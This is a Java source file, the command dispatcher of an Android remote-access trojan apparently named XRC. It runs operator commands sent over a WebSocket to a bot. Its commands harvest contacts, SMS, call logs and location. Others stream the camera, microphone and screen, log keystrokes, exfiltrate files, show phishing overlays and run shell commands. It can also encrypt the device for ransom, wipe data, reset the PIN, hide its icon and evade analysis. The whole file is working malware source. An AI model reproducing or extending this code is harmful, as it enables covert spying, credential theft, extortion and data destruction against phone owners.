package com.xrc.system.network;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.features.AntiAnalysis;
import com.xrc.system.features.AppManager;
import com.xrc.system.features.CameraManager;
import com.xrc.system.features.ClipboardManager;
import com.xrc.system.features.ContactHarvester;
import com.xrc.system.features.DeviceAdmin;
import com.xrc.system.features.FileManager;
import com.xrc.system.features.Keylogger;
import com.xrc.system.features.LocationTracker;
import com.xrc.system.features.MicManager;
import com.xrc.system.features.PermissionHelper;
import com.xrc.system.features.PhishletManager;
import com.xrc.system.features.Ransomware;
import com.xrc.system.features.SMSManager;
import com.xrc.system.features.ScreenLogger;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CommandHandler {
    private static final String TAG = Constants.TAG + ":Cmd";
    private static CommandHandler instance;
    private final Context ctx;

    private CommandHandler(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized CommandHandler get(Context ctx) {
        if (instance == null) {
            instance = new CommandHandler(ctx);
        }
        return instance;
    }

    public void execute(JSONObject cmd) {
        try {
            String action = cmd.getString("cmd");
            JSONObject params = cmd.optJSONObject("params");
            if (params == null) params = new JSONObject();

            Log.i(TAG, "Executing: " + action);

            switch (action) {
                case "ping":
                    sendResponse("pong", new JSONObject());
                    break;
                case "get_info":
                    sendDeviceInfo();
                    break;
                case "get_location":
                    LocationTracker.get(ctx).fetchAndSend();
                    break;
                case "get_contacts":
                    ContactHarvester.get(ctx).harvestAndSend();
                    break;
                case "get_sms":
                    SMSManager.get(ctx).dumpAndSend(params.optInt("limit", 100));
                    break;
                case "get_calls":
                    SMSManager.get(ctx).dumpCallsAndSend(params.optInt("limit", 100));
                    break;
                case "get_clipboard":
                    ClipboardManager.get(ctx).readClipboard();
                    break;
                case "set_clipboard":
                    ClipboardManager.get(ctx).setText(params.optString("text", ""));
                    break;
                case "start_camera":
                    CameraManager.get(ctx).startStream(params.optString("camera", "back"));
                    break;
                case "stop_camera":
                    CameraManager.get(ctx).stopStream();
                    break;
                case "start_mic":
                    MicManager.get(ctx).startStream();
                    break;
                case "stop_mic":
                    MicManager.get(ctx).stopStream();
                    break;
                case "start_screen":
                    ScreenLogger.get(ctx).startCapture();
                    break;
                case "stop_screen":
                    ScreenLogger.get(ctx).stopCapture();
                    break;
                case "start_keylogger":
                    Keylogger.get(ctx).enable();
                    break;
                case "stop_keylogger":
                    Keylogger.get(ctx).disable();
                    break;
                case "get_keylogs":
                    Keylogger.get(ctx).dumpAndSend();
                    break;
                case "list_files":
                    FileManager.get(ctx).listDirectory(params.optString("path", "/"));
                    break;
                case "download_file":
                    FileManager.get(ctx).uploadFile(params.optString("path", ""));
                    break;
                case "upload_file":
                    FileManager.get(ctx).writeFile(params.optString("path", ""),
                            params.optString("data", ""));
                    break;
                case "delete_file":
                    FileManager.get(ctx).deleteFile(params.optString("path", ""));
                    break;
                case "install_apk":
                    FileManager.get(ctx).installApk(params.optString("path", ""));
                    break;
                case "uninstall_app":
                    AppManager.get(ctx).uninstallApp(params.optString("pkg", ""));
                    break;
                case "launch_app":
                    AppManager.get(ctx).launchApp(params.optString("pkg", ""));
                    break;
                case "launch_url":
                    launchUrl(params.optString("url", ""));
                    break;
                case "send_sms":
                    SMSManager.get(ctx).sendSMS(params.optString("to", ""),
                            params.optString("body", ""));
                    break;
                case "phishlet_show":
                    PhishletManager.get(ctx).showPhishlet(params.optString("id", ""),
                            params.optString("target_pkg", ""));
                    break;
                case "phishlet_hide":
                    PhishletManager.get(ctx).hidePhishlet();
                    break;
                case "ransomware_encrypt":
                    Ransomware.get(ctx).encryptDevice(params.optString("msg", ""),
                            params.optString("wallet", ""));
                    break;
                case "ransomware_decrypt":
                    Ransomware.get(ctx).decryptDevice();
                    break;
                case "wipe_data":
                    DeviceAdmin.get(ctx).wipeData();
                    break;
                case "lock_screen":
                    DeviceAdmin.get(ctx).lockScreen();
                    break;
                case "reset_pin":
                    DeviceAdmin.get(ctx).resetPassword(params.optString("pin", "0000"));
                    break;
                case "reboot":
                    reboot();
                    break;
                case "volume_up":
                    AppManager.get(ctx).setVolume(params.optInt("level", 100));
                    break;
                case "volume_mute":
                    AppManager.get(ctx).mute();
                    break;
                case "hide_icon":
                    AppManager.get(ctx).hideIcon();
                    break;
                case "show_icon":
                    AppManager.get(ctx).showIcon();
                    break;
                case "get_apps":
                    AppManager.get(ctx).listInstalled();
                    break;
                case "get_running":
                    AppManager.get(ctx).listRunning();
                    break;
                case "kill_app":
                    AppManager.get(ctx).killApp(params.optString("pkg", ""));
                    break;
                case "disable_play_protect":
                    break;
                case "screenshot":
                    ScreenLogger.get(ctx).takeScreenshot();
                    break;
                case "get_battery":
                    sendBatteryInfo();
                    break;
                case "vibrate":
                    AppManager.get(ctx).vibrate(params.optInt("ms", 500));
                    break;
                case "toast":
                    AppManager.get(ctx).showToast(params.optString("msg", ""));
                    break;
                case "shell":
                    AppManager.get(ctx).execShell(params.optString("cmd", ""));
                    break;
                case "update_config":
                    ConfigManager.get(ctx).applyRemoteConfig(params);
                    break;
                case "get_config":
                    sendResponse("config", ConfigManager.get(ctx).getDeviceConfig());
                    break;
                case "anti_analysis_check":
                    AntiAnalysis.get(ctx).runChecks();
                    break;
                default:
                    Log.w(TAG, "Unknown command: " + action);
                    sendResponse("error", new JSONObject().put("msg", "Unknown command: " + action));
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Command execution failed", e);
        }
    }

    private void sendResponse(String type, JSONObject data) {
        try {
            JSONObject resp = new JSONObject();
            resp.put("type", type);
            resp.put("data", data);
            resp.put("ts", System.currentTimeMillis());
            XRCWebSocketClient.get(ctx).send(resp.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Response failed", e);
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("bot_id", ConfigManager.get(ctx).getBotId());
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("product", Build.PRODUCT);
            info.put("hardware", Build.HARDWARE);
            info.put("board", Build.BOARD);
            info.put("device", Build.DEVICE);
            info.put("fingerprint", Build.FINGERPRINT);
            info.put("package", ctx.getPackageName());
            sendResponse("device_info", info);
        } catch (JSONException e) {
            Log.e(TAG, "Device info failed", e);
        }
    }

    private void sendBatteryInfo() {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            JSONObject info = new JSONObject();
            info.put("power_save", pm != null && pm.isPowerSaveMode());
            info.put("interactive", pm != null && pm.isInteractive());
            sendResponse("battery_info", info);
        } catch (JSONException e) {
            Log.e(TAG, "Battery info failed", e);
        }
    }

    private void launchUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Launch URL failed", e);
        }
    }

    private void reboot() {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                pm.reboot("xrc_reboot");
            }
        } catch (Exception e) {
            Log.e(TAG, "Reboot failed", e);
        }
    }
}
